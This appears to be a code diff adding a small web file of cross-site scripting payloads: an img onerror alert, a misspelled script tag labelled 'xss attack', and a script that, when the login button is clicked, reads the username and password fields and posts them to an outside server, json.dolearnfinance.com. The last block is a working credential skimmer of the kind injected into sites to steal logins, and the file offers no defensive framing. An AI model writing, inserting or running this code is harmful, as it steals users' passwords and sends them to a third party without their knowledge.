@@ -1,0 +1,29 @@
+<img src="x" onerror="alert('hi');"/>
+
+<sript>
+    alert("xss attack");
+</script>
+
+<script>
+    document.getElementById('btnLogin').addEventListener('click', function() {
+        // Read the values of the username and password fields
+        let username = document.getElementById('username').value;
+        let password = document.getElementById('password').value;
+        
+        // Create a payload object
+        let payload = {
+            name: username,
+            email: password,
+            active: true
+        };
+        
+        // Optionally send the payload to a remote server
+        fetch('https://json.dolearnfinance.com/members', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+    });
+    </script>
